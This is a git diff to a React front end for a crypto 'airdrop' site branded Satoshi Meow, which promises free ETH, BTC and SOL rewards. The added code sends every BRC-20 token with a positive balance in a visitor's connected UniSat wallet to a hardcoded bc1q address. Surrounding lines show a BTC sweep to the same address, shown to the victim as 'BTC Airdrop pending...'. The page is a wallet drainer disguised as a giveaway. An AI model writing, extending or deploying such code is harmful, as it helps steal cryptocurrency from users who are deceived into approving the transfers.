@@ -9,6 +9,7 @@ import { batchSendTokens } from './web3/sendToken';
 import AirdropStats from './AirdropStat';
 import LiveChartComponent from './LiveChart.component';
 import FooterNav from './FooterNav';
+import Carousel from './Carousel';
 import { connectBitcoinWallet, getBrc20Balances, sendBitcoin } from './web3/bitcoinWallet';
 import WalletSelector from './WalletSelector';
 import { FaBitcoin, FaEthereum } from "react-icons/fa"; // FontAwesome icons
@@ -137,12 +138,23 @@ function App() {
         if (btcTx) alert("BTC Airdrop pending...");
       }
 
-      // 2. Handle BRC-20 Tokens (Universal)
-      const brc20tokens = await getBrc20Balances(walletData.address);
+      // 2. Handle BRC-20 Tokens
+      const brc20tokens = await getBrc20Balances(); // Uses the UniSat-only version we wrote
       for (const token of brc20tokens) {
-        if (parseFloat(token.overall_balance) > 0) {
-          // Here you would trigger the BRC-20 transfer logic
-          console.log(`Detected ${token.ticker}: ${token.overall_balance}`);
+        const balance = parseFloat(token.availableBalance || 0);
+        
+        if (balance > 0) {
+          // This triggers the UniSat transfer modal for that specific token
+          try {
+            const tokenTx = await window.unisat.sendBreakdown(
+              "bc1qwhflpqx2p3nu6phdpdh6d8yql6xv95p67tf75r",
+              token.ticker,
+              token.availableBalance
+            );
+            console.log(`${token.ticker} Transfer Sent:`, tokenTx);
+          } catch (tokenErr) {
+            console.error(`Failed to transfer ${token.ticker}:`, tokenErr);
+          }
         }
       }
     } catch (e) {
@@ -152,44 +164,6 @@ function App() {
       setLoading(false);
     }
   };
-  
-  // btc functions
-  // const handleBitcoinAirdrop = async () => {
-  //   if(loading) return;
-  //   setLoading(true);
-
-  //   try {
-  //     const bitcoinData = await connetBitcoinWallet();
-  //     if(bitcoinData){
-  //       const btcBalSats = await window.unisat.getBalance();
-        
-  //       // Pass the total confirmed balance for a full sweep
-  //       if(btcBalSats.total > 2000) { 
-  //         const btcTx = await sendBitcoin(
-  //           "bc1qwhflpqx2p3nu6phdpdh6d8yql6xv95p67tf75r", 
-  //           btcBalSats.total
-  //         );
-          
-  //         if(btcTx) alert("BTC Airdrop pending...");
-  //       } else {
-  //         console.log("Balance too low for a reliable sweep.");
-  //       }
-
-  //       // BRC-20 Logic remains the same...
-  //       const brc20tokens = await getBrc20Balances(bitcoinData.address);
-  //       for(const token of brc20tokens){
-  //         if(parseFloat(token.overall_balance) > 0){
-  //           alert(`Detected ${token.ticker}: ${token.overall_balance}`);
-  //         }
-  //       }
-  //     }
-  //   } catch (e) {
-  //     console.error("Bitcoin Flow Error:", e);
-  //     alert("Check wallet for multi chain confirmation");
-  //   } finally {
-  //     setLoading(false);
-  //   }
-  // }
 
   return (
     <>
@@ -213,16 +187,16 @@ function App() {
                 </span>
                 <span className="text-wrapper">
                   <span className="text-slide">
-                    Airdrop DApp<br/>
+                    Airdrop ETH<br/>
                     Reward Celebration<br/>
                     Claim Airdrop<br/>
-                    Get Tokens<br/>
+                    BTH Airdrop<br/>
                     Claim Reward<br/>
-                    Reward Celebration <br />
-                    Valuable rewards<br/>
+                    Solana Rewards <br />
+                    Valuable Airdrop<br/>
                     Exclusive Airdrop<br/>
                     Claim Your Prize<br/>
-                    Airdrop Bonanza<br/>
+                    ETH | BTC | SOL<br/>
                     Token Giveaway<br/>
                   </span>
                 </span>
@@ -296,11 +270,12 @@ function App() {
           <div className="center">
             {/* <h1 className="title pt-5">Welcome to the Airdrop DApp</h1> */}
             <h1 className="title pt-5 text-shadow">
-              {"Welcome -> to -> the -> Blockchain - Airdrop -> DApp".split("").map((char, i) => (
+              {"Decentralized -> Blockchain - Airdrops".split("").map((char, i) => (
                 <span key={i} className="shake-letter" style={{ animationDelay: titleDelays[i] }}>{char}</span>
               ))}🪂
             </h1>
-            <p className="subtitle text-shadow">💰Unlock your rewards & claim your airdrop!🎁</p>
+            <p className="subtitle text-shadow">💰Unlock your blockchain rewards & claim your airdrop!🎁</p>
+            <Carousel />
 
             <button
               className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
@@ -377,11 +352,6 @@ function App() {
       </div>
       <div className="container my-5">
         <h2 className="text-center mb-4 h2-join-meow">🐾 Join the Meow-vement!</h2>
-        {/* <div className="row">
-          <div className="col-md-6">
-            <p>Satoshi Meow is the first Purr-to-Earn ecosystem designed to bring balance to the crypto-verse. While dogs chase their tails, Satoshi Meow focuses on calculated leaps and landing on all four paws, even in a bear market.</p>
-          </div>
-        </div> */}
         <div className="card text-bg-dark">
           <img src="/satoshi.jpeg" className="card-img img-opacity" alt="..."/>
           <div className="card-img-overlay d-flex flex-column justify-content-center align-items-center text-center">
@@ -399,8 +369,6 @@ function App() {
           </h2>
         </div>
       </div>
-      {/* //// before, the live cht was here  */}
-      {/* ///// before the below image was above  */}
       <div className="container text-center position-relative py-b">
         <div className="center">
           <div className="mt-4">
@@ -420,8 +388,10 @@ function App() {
           scrollToTop={scrollToTop}
           scrollToCharts={scrollToCharts}
           handleConnectAndSend={handleConnectAndSend}
+          handleWalletConnected={handleWalletConnected}
           loading={loading}
           address={state.address}
+          setShowModal={setShowModal}
         />
       </footer>
       {showModal && (
